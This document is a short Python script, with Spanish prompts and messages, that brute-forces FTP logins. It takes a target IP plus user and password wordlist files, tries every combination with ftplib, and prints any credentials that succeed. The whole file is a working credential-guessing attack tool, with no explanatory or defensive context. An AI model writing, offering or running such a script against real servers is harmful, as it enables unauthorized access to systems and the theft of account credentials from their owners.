import argparse
import sys
import ftplib

def parsers():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",help="Colocar la ip")
    parser.add_argument("-u","--user",help="colocar ruta de archivo user")
    parser.add_argument("-p", "--password",help="Colocar ruta de archivo password")
    return parser.parse_args()

def bruteForce(target,user,password):
    ftp = ftplib.FTP(target)
    try:
        ftp.login(user,password)
        print("Se encontraron estas credenciales: {}:{}".format(user,password))
    except:
        print("Fallo de autenticacion con: {}:{}".format(user,password))
    finally:
        ftp.quit()

def main():
    args = parsers()

    if args.target and args.user and args.password:
        print("Target: " + args.target)
        try:
       
            with open(args.user,"r") as user_file:
                users = user_file.read().split("\n")

            with open(args.password,"r") as password_file:
                passwords = password_file.read().split("\n")

            for user in users:
                for password in passwords:
                    bruteForce(args.target,user,password)
        except FileNotFoundError:
            print("Error: Archivo no encontrado.")
        except Exception as e:
            print(f"Error inesperado: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
